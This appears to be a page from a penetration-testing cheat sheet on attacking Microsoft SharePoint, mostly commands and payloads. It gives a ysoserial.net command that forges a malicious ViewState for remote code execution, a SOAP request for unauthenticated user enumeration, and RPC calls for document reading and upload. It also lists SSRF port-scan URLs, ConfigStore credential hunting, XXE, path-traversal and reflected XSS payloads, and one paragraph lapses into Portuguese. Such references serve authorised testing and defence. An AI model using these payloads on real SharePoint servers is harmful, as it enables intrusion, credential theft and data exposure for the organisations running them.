---
tags:
  - Web
  - Windows
---

# :material-microsoft-sharepoint: SharePoint

<span class="pill pill-hard">.NET deserialization RCE</span> <span class="pill pill-info">web</span>

Microsoft SharePoint is a .NET app with a steady stream of **unauth deserialization
RCE** CVEs (ToolShell, ViewState) and a huge internal-document attack surface.

!!! abstract "TL;DR"
    Fingerprint the version → match a deserialization CVE (2019-0604, 2020-1147,
    the 2023/2025 ToolShell chain) → or, with a leaked machineKey, forge a
    `__VIEWSTATE` for RCE. Then loot documents/sites.

## :material-magnify: Identify

```bash
curl -sI http://$TARGET/_layouts/15/start.aspx | grep -i microsoftsharepoint
curl -s http://$TARGET/_vti_pvt/service.cnf
curl -s http://$TARGET/_layouts/15/help.aspx        # version banners
# X-SharePointHealthScore / MicrosoftSharePointTeamServices headers
```

## :material-fire: Deserialization RCE CVEs

```text
# CVE-2019-0604   — unauth RCE via XmlSerializer (Picker/ItemPicker)
# CVE-2020-1147   — .NET DataSet deserialization
# CVE-2021-27076  — RCE via list deserialization
# ToolShell (2025) — CVE-2025-53770 unauth RCE chain (on-prem)
# pick by exact version; PoCs use ysoserial.net gadgets
```

!!! loot "Leaked machineKey → ViewState RCE"
    If you find the `machineKey` (config leak, another SharePoint bug), forge a
    malicious `__VIEWSTATE`:
    ```bash
    ysoserial.exe -p ViewState -g TypeConfuseDelegate \
      --generator=<gen> --validationkey=<vk> --validationalg=<alg> -c "cmd /c whoami"
    ```
    See [Deserialization](../web/deserialization.md).

## :material-account-search: Web-service user/group enumeration

Legacy `.asmx` / `listdata.svc` services frequently answer unauthenticated or
over-permissively:

```text
/_vti_bin/spdisco.aspx                       # lists available web services
/_vti_bin/People.asmx        (SearchPrincipals)   # user search
/_vti_bin/UserGroup.asmx     (GetAllUserCollectionFromWeb / GetGroupInfo)
/_vti_bin/listdata.svc/UserInformationList        # all users
/_vti_bin/listdata.svc/UserInformationList(<id>)  # iterate 1..N
/_layouts/userdisp.aspx?Force=True&ID=<n>         # iterate ID for user info
```

```http
POST /_vti_bin/People.asmx HTTP/1.1
Host: $TARGET
Content-Type: text/xml; charset=utf-8
SOAPAction: "http://schemas.microsoft.com/sharepoint/soap/SearchPrincipals"

<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body>
  <SearchPrincipals xmlns="http://schemas.microsoft.com/sharepoint/soap/">
    <searchText>System</searchText><maxResults>50</maxResults><principalType>All</principalType>
  </SearchPrincipals>
</soap:Body></soap:Envelope>
```

!!! tip "Blocked /_vti_bin/?"
    A bad `web.config` may only block the root — retry via
    `/<valid_subsite>/_vti_bin/…`.

## :material-file-search: Vermeer RPC (FrontPage / author.dll)

Version + document access via the FrontPage RPC surface:

```text
GET /_vti_inf.html            # FPVersion + MicrosoftSharePointTeamServices build number
POST /_vti_bin/_vti_aut/author.dll     # X-Vermeer-Content-Type: application/x-www-form-urlencoded
#   method=open service:<FPVersion>&service_name=/          → server info
#   method=get document:<FPVersion>&document_name=_private  → read docs (_private, _catalogs)
#   method=put document:<FPVersion>&…                       → upload (if writable)
```

Match the build number against
[buildnumbers.wordpress.com/sharepoint](https://buildnumbers.wordpress.com/sharepoint/).

## :material-lan: SSRF / internal port-scan

```text
# wacproxy.ashx — error vs timeout distinguishes open/closed internal host:port
/_vti_bin/wacproxy.ashx?redirect=http://$TARGET&spsite=http://<INTERNAL>/_layouts/images/&docType=PP&callbackFunctionName=b
#   open  -> parent.window['b']('ERROR:603:WebException ... (404) Not Found.')
#   closed-> timeout
```

With a valid session, `client.svc/ProcessQuery` (the `?FollowSite` flow) can be
repointed at internal hosts in its `<Parameter>` value — same SSRF oracle.

## :material-lock-open: Config / credential disclosure

```text
/_layouts/15/settings.aspx    →  "Content and structure"  →  /_layouts/15/sitemanager.aspx
/Lists/ConfigStore/AllItems.aspx
```

Search the ConfigStore for items named **`_Config`** — they often hold credentials in
cleartext. (The `/15/` segment varies by version or may be absent.)

## :material-file-code: XXE via search / XML Web Part

```text
POST /_vti_bin/search.asmx/Query        # queryXml accepts a DOCTYPE w/ external entity
POST /_vti_bin/search.asmx  (Registration/registrationXml — DTD must be HTML-encoded)
```

**XML Web Part:** como administrador da aplicação, adicionar uma Web Part "XML Viewer"
(`Site Actions > Edit Page`) e importar um XML com uma entidade externa + um XSL que
faz `xsl:value-of` para ler ficheiros do sistema (ex.: `c:\Windows\iis7.log`). See
[XXE](../web/xxe.md).

## :material-directions-fork: Traversal, XSS & uploaders

```text
# Path traversal
/_layouts/ScriptResx.ashx?name=<..%2f..%2f traversal>&culture=en-us
# Reflected XSS (calendar, search, FollowSite)
/Lists/Calendar/calendar.aspx?q=<script>alert(1)</script>
/?FollowSite=0&SiteName='-confirm(document.domain)-'
# Internal uploaders — reuse any GUID found on the site as the List id
/_layouts/UploadEx.aspx?List={<GUID>}&RootFolder=&Source=
/_layouts/Upload.aspx?MultipleUpload=1&List={<GUID>}&RootFolder=/Directory
```

Enumerate + fingerprint with **Sparty** (`sparty.py -v ms_sharepoint -u https://$TARGET`)
and the FuzzDB SharePoint wordlist via `dirb`/`ffuf`.

## :material-link-variant: Related

- Fingerprinted at [Web Technologies](index.md) / [Ports](../network/ports.md).
- ViewState → [Deserialization](../web/deserialization.md); shell → [Windows Privesc](../privesc/windows.md).
- Reference: [HackTricks SharePoint](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/index.html).
